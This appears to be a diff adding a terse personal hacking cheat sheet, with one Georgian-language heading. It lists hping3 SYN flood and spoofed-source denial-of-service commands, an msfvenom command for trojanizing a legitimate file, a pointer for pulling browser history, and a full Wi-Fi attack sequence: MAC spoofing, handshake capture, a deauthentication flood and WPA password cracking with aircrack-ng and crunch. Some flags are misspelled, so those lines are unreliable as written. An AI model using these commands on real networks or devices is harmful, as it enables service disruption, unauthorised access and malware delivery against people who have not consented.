@@ -1,0 +1,42 @@
+DOS:
+
+hping3 --flood -S -p port_n i_addr
+
+hping3 --rand-soource --flood ...
+
+hping3 -a 192.168.1.12 192.168.1.12 -S -folld -p 80
+
+
+get google history:-- nirsoft.net
+
+
+trojan:-- msfvenom -x legitimate_file -p payload -o trojanized_file
+
+
+----------------
+
+wifi hacking:
+
+
+airmon-ng start wlan0
+
+ifconfig wlan0mon down
+
+macchanger -r wlan0mon
+
+ifconfig wlan0mon up
+
+#scanning
+airodump-ng wlan0mon
+#catch handshake
+airodump-ng wlan0mon --bssid MAC_address --channel 2 --write name
+
+#NEW TERMINAL
+#attack to temper connection
+aireplay-ng --deauth 2000 -a MAC_address wlan0mon
+
+handshake პაროლის მორგება:-- 
+aircrack-ng -b MAC_address -w wordlist.lst handshake-*.cap
+
+crunch 8 8 fgiro27 | aircrack-ng -b MAC_address -w - handshake-*.cap
+
